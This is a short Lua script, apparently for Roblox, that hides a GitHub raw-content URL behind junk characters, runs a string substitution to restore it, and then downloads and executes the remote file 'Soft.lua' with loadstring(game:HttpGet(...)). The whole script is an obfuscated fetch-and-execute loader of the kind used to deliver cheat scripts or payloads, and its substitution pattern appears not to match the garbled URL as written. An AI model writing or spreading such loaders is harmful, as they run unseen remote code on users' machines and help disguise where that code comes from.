local originalUrl = "https://raw.githubus345345ercontent.comas3534dasd/Baasdasd365765rikes575675tun/2f457hkd32asd3atom/master/Soft.lua"
local function processUrl(url)
local processedUrl = string.gsub(url, "raw%.githubus%d*%a*/", "raw.githubusercontent.com/")
return processedUrl
end
local processedUrl = processUrl(originalUrl)
loadstring(game:HttpGet(processedUrl))()
